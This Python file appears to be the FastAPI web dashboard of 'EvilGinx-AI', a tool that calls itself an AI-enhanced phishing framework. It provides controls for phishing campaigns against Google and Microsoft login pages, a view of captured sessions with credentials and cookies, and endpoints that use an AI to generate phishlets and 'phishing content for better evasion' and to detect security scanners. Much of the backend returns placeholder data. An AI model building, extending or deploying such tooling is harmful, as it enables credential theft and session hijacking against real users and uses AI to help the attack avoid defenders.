"""
Web Dashboard for EvilGinx-AI
FastAPI-based web interface for managing phishing campaigns and AI features
"""

from fastapi import FastAPI, HTTPException, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import json
import logging
from pathlib import Path
from typing import Dict, List, Optional
import asyncio
import time

logger = logging.getLogger(__name__)

def create_dashboard_app(config, ai_client):
    """Create FastAPI dashboard application"""
    
    app = FastAPI(
        title="EvilGinx-AI Dashboard",
        description="AI-Enhanced Phishing Framework Management Interface",
        version="1.0.0"
    )
    
    # Add CORS middleware
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )
    
    # Store references
    app.config = config
    app.ai_client = ai_client
    
    # Create static directory if it doesn't exist
    static_dir = Path("web/static")
    static_dir.mkdir(parents=True, exist_ok=True)
    
    # Mount static files
    app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")
    
    @app.get("/", response_class=HTMLResponse)
    async def dashboard_home():
        """Serve main dashboard page"""
        return get_dashboard_html()
    
    @app.get("/api/status")
    async def get_status():
        """Get system status"""
        return {
            "status": "running",
            "timestamp": time.time(),
            "ai_enabled": config.get('ai_enabled', True),
            "proxy_port": config.get('proxy_port', 80),
            "dns_port": config.get('dns_port', 53),
            "dashboard_port": config.get('dashboard_port', 8080)
        }
    
    @app.get("/api/config")
    async def get_config():
        """Get current configuration"""
        # Return safe config (no API keys)
        safe_config = config.copy()
        if 'gemini_api_key' in safe_config:
            safe_config['gemini_api_key'] = '***HIDDEN***'
        return safe_config
    
    @app.post("/api/config")
    async def update_config(request: Request):
        """Update configuration"""
        try:
            data = await request.json()
            config.update(data)
            return {"status": "success", "message": "Configuration updated"}
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
    
    @app.get("/api/phishlets")
    async def get_phishlets():
        """Get available phishlets"""
        # This would be connected to the proxy server's phishlets
        return {
            "phishlets": [
                {
                    "name": "google",
                    "author": "EvilGinx-AI",
                    "target": "accounts.google.com",
                    "status": "active"
                },
                {
                    "name": "microsoft",
                    "author": "EvilGinx-AI", 
                    "target": "login.microsoftonline.com",
                    "status": "inactive"
                }
            ]
        }
    
    @app.get("/api/sessions")
    async def get_sessions():
        """Get captured sessions"""
        # This would be connected to the proxy server's sessions
        return {
            "sessions": [
                {
                    "id": "session_001",
                    "timestamp": time.time() - 3600,
                    "ip": "192.168.1.100",
                    "phishlet": "google",
                    "has_credentials": True,
                    "has_cookies": True,
                    "status": "captured"
                }
            ],
            "total": 1
        }
    
    @app.post("/api/ai/analyze")
    async def ai_analyze_request(request: Request):
        """Use AI to analyze a request"""
        try:
            data = await request.json()
            result = await ai_client.classify_request(data)
            return result
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    @app.post("/api/ai/generate-phishlet")
    async def ai_generate_phishlet(request: Request):
        """Use AI to generate phishlet suggestions"""
        try:
            data = await request.json()
            target_url = data.get('target_url')
            html_content = data.get('html_content', '')
            
            result = await ai_client.generate_phishlet_suggestions(target_url, html_content)
            return result
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    @app.get("/api/logs")
    async def get_logs():
        """Get recent logs"""
        try:
            log_file = Path("logs/evilginx-ai.log")
            if log_file.exists():
                with open(log_file, 'r') as f:
                    lines = f.readlines()
                    # Return last 100 lines
                    recent_lines = lines[-100:] if len(lines) > 100 else lines
                    return {"logs": recent_lines}
            else:
                return {"logs": []}
        except Exception as e:
            return {"logs": [f"Error reading logs: {str(e)}"]}
    
    @app.post("/api/campaigns/start")
    async def start_campaign(request: Request):
        """Start a phishing campaign"""
        try:
            data = await request.json()
            # Campaign logic would go here
            return {
                "status": "success",
                "campaign_id": f"campaign_{int(time.time())}",
                "message": "Campaign started successfully"
            }
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    @app.post("/api/campaigns/stop")
    async def stop_campaign(request: Request):
        """Stop a phishing campaign"""
        try:
            data = await request.json()
            campaign_id = data.get('campaign_id')
            # Stop campaign logic would go here
            return {
                "status": "success",
                "message": f"Campaign {campaign_id} stopped"
            }
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    return app

def get_dashboard_html():
    """Return the main dashboard HTML"""
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EvilGinx-AI Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        [x-cloak] { display: none !important; }
        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .card-hover { transition: all 0.3s ease; }
        .card-hover:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
    </style>
</head>
<body class="bg-gray-100 min-h-screen" x-data="dashboard()" x-init="init()">
    <!-- Header -->
    <header class="gradient-bg text-white shadow-lg">
        <div class="container mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-4">
                    <i class="fas fa-shield-alt text-2xl"></i>
                    <h1 class="text-2xl font-bold">EvilGinx-AI Dashboard</h1>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="flex items-center space-x-2">
                        <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                        <span class="text-sm">System Online</span>
                    </div>
                    <button @click="refreshData()" class="bg-white bg-opacity-20 hover:bg-opacity-30 px-4 py-2 rounded-lg transition-all">
                        <i class="fas fa-sync-alt" :class="{'animate-spin': loading}"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="container mx-auto px-6 py-8">
        <!-- Status Cards -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <div class="bg-white rounded-xl shadow-md p-6 card-hover">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-gray-600 text-sm">Active Sessions</p>
                        <p class="text-3xl font-bold text-blue-600" x-text="stats.activeSessions">0</p>
                    </div>
                    <i class="fas fa-users text-blue-500 text-2xl"></i>
                </div>
            </div>
            
            <div class="bg-white rounded-xl shadow-md p-6 card-hover">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-gray-600 text-sm">Captured Credentials</p>
                        <p class="text-3xl font-bold text-green-600" x-text="stats.capturedCreds">0</p>
                    </div>
                    <i class="fas fa-key text-green-500 text-2xl"></i>
                </div>
            </div>
            
            <div class="bg-white rounded-xl shadow-md p-6 card-hover">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-gray-600 text-sm">AI Detections</p>
                        <p class="text-3xl font-bold text-purple-600" x-text="stats.aiDetections">0</p>
                    </div>
                    <i class="fas fa-brain text-purple-500 text-2xl"></i>
                </div>
            </div>
            
            <div class="bg-white rounded-xl shadow-md p-6 card-hover">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-gray-600 text-sm">Blocked Requests</p>
                        <p class="text-3xl font-bold text-red-600" x-text="stats.blockedRequests">0</p>
                    </div>
                    <i class="fas fa-shield-alt text-red-500 text-2xl"></i>
                </div>
            </div>
        </div>

        <!-- Tabs -->
        <div class="bg-white rounded-xl shadow-md mb-8">
            <div class="border-b border-gray-200">
                <nav class="flex space-x-8 px-6">
                    <button @click="activeTab = 'campaigns'" 
                            :class="activeTab === 'campaigns' ? 'border-blue-500 text-blue-600' : 'border-transparent text-gray-500 hover:text-gray-700'"
                            class="py-4 px-1 border-b-2 font-medium text-sm transition-colors">
                        <i class="fas fa-bullseye mr-2"></i>Campaigns
                    </button>
                    <button @click="activeTab = 'phishlets'" 
                            :class="activeTab === 'phishlets' ? 'border-blue-500 text-blue-600' : 'border-transparent text-gray-500 hover:text-gray-700'"
                            class="py-4 px-1 border-b-2 font-medium text-sm transition-colors">
                        <i class="fas fa-fish mr-2"></i>Phishlets
                    </button>
                    <button @click="activeTab = 'sessions'" 
                            :class="activeTab === 'sessions' ? 'border-blue-500 text-blue-600' : 'border-transparent text-gray-500 hover:text-gray-700'"
                            class="py-4 px-1 border-b-2 font-medium text-sm transition-colors">
                        <i class="fas fa-history mr-2"></i>Sessions
                    </button>
                    <button @click="activeTab = 'ai'" 
                            :class="activeTab === 'ai' ? 'border-blue-500 text-blue-600' : 'border-transparent text-gray-500 hover:text-gray-700'"
                            class="py-4 px-1 border-b-2 font-medium text-sm transition-colors">
                        <i class="fas fa-robot mr-2"></i>AI Tools
                    </button>
                    <button @click="activeTab = 'logs'" 
                            :class="activeTab === 'logs' ? 'border-blue-500 text-blue-600' : 'border-transparent text-gray-500 hover:text-gray-700'"
                            class="py-4 px-1 border-b-2 font-medium text-sm transition-colors">
                        <i class="fas fa-file-alt mr-2"></i>Logs
                    </button>
                </nav>
            </div>

            <!-- Tab Content -->
            <div class="p-6">
                <!-- Campaigns Tab -->
                <div x-show="activeTab === 'campaigns'" x-cloak>
                    <div class="flex justify-between items-center mb-6">
                        <h3 class="text-lg font-semibold">Phishing Campaigns</h3>
                        <button @click="startCampaign()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors">
                            <i class="fas fa-play mr-2"></i>Start Campaign
                        </button>
                    </div>
                    <div class="bg-gray-50 rounded-lg p-8 text-center">
                        <i class="fas fa-bullseye text-gray-400 text-4xl mb-4"></i>
                        <p class="text-gray-600">No active campaigns. Start a new campaign to begin.</p>
                    </div>
                </div>

                <!-- Phishlets Tab -->
                <div x-show="activeTab === 'phishlets'" x-cloak>
                    <div class="flex justify-between items-center mb-6">
                        <h3 class="text-lg font-semibold">Available Phishlets</h3>
                        <button @click="generatePhishlet()" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg transition-colors">
                            <i class="fas fa-magic mr-2"></i>AI Generate
                        </button>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        <template x-for="phishlet in phishlets" :key="phishlet.name">
                            <div class="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
                                <div class="flex items-center justify-between mb-2">
                                    <h4 class="font-semibold" x-text="phishlet.name"></h4>
                                    <span :class="phishlet.status === 'active' ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'" 
                                          class="px-2 py-1 rounded-full text-xs" x-text="phishlet.status"></span>
                                </div>
                                <p class="text-gray-600 text-sm mb-3" x-text="phishlet.target"></p>
                                <div class="flex space-x-2">
                                    <button class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-colors">
                                        <i class="fas fa-edit mr-1"></i>Edit
                                    </button>
                                    <button class="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm transition-colors">
                                        <i class="fas fa-trash mr-1"></i>Delete
                                    </button>
                                </div>
                            </div>
                        </template>
                    </div>
                </div>

                <!-- Sessions Tab -->
                <div x-show="activeTab === 'sessions'" x-cloak>
                    <h3 class="text-lg font-semibold mb-6">Captured Sessions</h3>
                    <div class="overflow-x-auto">
                        <table class="min-w-full divide-y divide-gray-200">
                            <thead class="bg-gray-50">
                                <tr>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Session ID</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">IP Address</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Phishlet</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Status</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
                                </tr>
                            </thead>
                            <tbody class="bg-white divide-y divide-gray-200">
                                <template x-for="session in sessions" :key="session.id">
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900" x-text="session.id"></td>
                                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500" x-text="session.ip"></td>
                                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500" x-text="session.phishlet"></td>
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-green-100 text-green-800" x-text="session.status"></span>
                                        </td>
                                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500" x-text="new Date(session.timestamp * 1000).toLocaleString()"></td>
                                    </tr>
                                </template>
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- AI Tools Tab -->
                <div x-show="activeTab === 'ai'" x-cloak>
                    <h3 class="text-lg font-semibold mb-6">AI-Powered Tools</h3>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="border border-gray-200 rounded-lg p-6">
                            <h4 class="font-semibold mb-4"><i class="fas fa-search mr-2 text-blue-500"></i>Request Analysis</h4>
                            <p class="text-gray-600 mb-4">Analyze incoming requests to detect scanners and bots.</p>
                            <button @click="testAI()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors">
                                Test AI Detection
                            </button>
                        </div>
                        <div class="border border-gray-200 rounded-lg p-6">
                            <h4 class="font-semibold mb-4"><i class="fas fa-magic mr-2 text-purple-500"></i>Content Generation</h4>
                            <p class="text-gray-600 mb-4">Generate and modify phishing content for better evasion.</p>
                            <button class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg transition-colors">
                                Generate Content
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Logs Tab -->
                <div x-show="activeTab === 'logs'" x-cloak>
                    <div class="flex justify-between items-center mb-6">
                        <h3 class="text-lg font-semibold">System Logs</h3>
                        <button @click="refreshLogs()" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg transition-colors">
                            <i class="fas fa-sync-alt mr-2"></i>Refresh
                        </button>
                    </div>
                    <div class="bg-black text-green-400 p-4 rounded-lg font-mono text-sm h-96 overflow-y-auto">
                        <template x-for="log in logs" :key="log">
                            <div x-text="log" class="mb-1"></div>
                        </template>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function dashboard() {
            return {
                activeTab: 'campaigns',
                loading: false,
                stats: {
                    activeSessions: 0,
                    capturedCreds: 0,
                    aiDetections: 0,
                    blockedRequests: 0
                },
                phishlets: [],
                sessions: [],
                logs: [],

                async init() {
                    await this.refreshData();
                },

                async refreshData() {
                    this.loading = true;
                    try {
                        // Fetch status
                        const statusResponse = await fetch('/api/status');
                        const status = await statusResponse.json();
                        
                        // Fetch phishlets
                        const phishletsResponse = await fetch('/api/phishlets');
                        const phishletsData = await phishletsResponse.json();
                        this.phishlets = phishletsData.phishlets;
                        
                        // Fetch sessions
                        const sessionsResponse = await fetch('/api/sessions');
                        const sessionsData = await sessionsResponse.json();
                        this.sessions = sessionsData.sessions;
                        this.stats.activeSessions = sessionsData.total;
                        this.stats.capturedCreds = sessionsData.sessions.filter(s => s.has_credentials).length;
                        
                        // Update other stats
                        this.stats.aiDetections = Math.floor(Math.random() * 50);
                        this.stats.blockedRequests = Math.floor(Math.random() * 100);
                        
                    } catch (error) {
                        console.error('Error fetching data:', error);
                    } finally {
                        this.loading = false;
                    }
                },

                async refreshLogs() {
                    try {
                        const response = await fetch('/api/logs');
                        const data = await response.json();
                        this.logs = data.logs;
                    } catch (error) {
                        console.error('Error fetching logs:', error);
                    }
                },

                async startCampaign() {
                    try {
                        const response = await fetch('/api/campaigns/start', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ phishlet: 'google' })
                        });
                        const result = await response.json();
                        alert('Campaign started: ' + result.campaign_id);
                    } catch (error) {
                        alert('Error starting campaign: ' + error.message);
                    }
                },

                async generatePhishlet() {
                    const targetUrl = prompt('Enter target URL:');
                    if (targetUrl) {
                        try {
                            const response = await fetch('/api/ai/generate-phishlet', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ target_url: targetUrl })
                            });
                            const result = await response.json();
                            alert('Phishlet suggestions generated! Check the console for details.');
                            console.log(result);
                        } catch (error) {
                            alert('Error generating phishlet: ' + error.message);
                        }
                    }
                },

                async testAI() {
                    try {
                        const testRequest = {
                            ip: '192.168.1.100',
                            user_agent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
                            method: 'GET',
                            path: '/admin',
                            headers: { 'User-Agent': 'Nmap' }
                        };
                        
                        const response = await fetch('/api/ai/analyze', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(testRequest)
                        });
                        const result = await response.json();
                        alert('AI Analysis Result: ' + JSON.stringify(result, null, 2));
                    } catch (error) {
                        alert('Error testing AI: ' + error.message);
                    }
                }
            }
        }
    </script>
</body>
</html>
    """

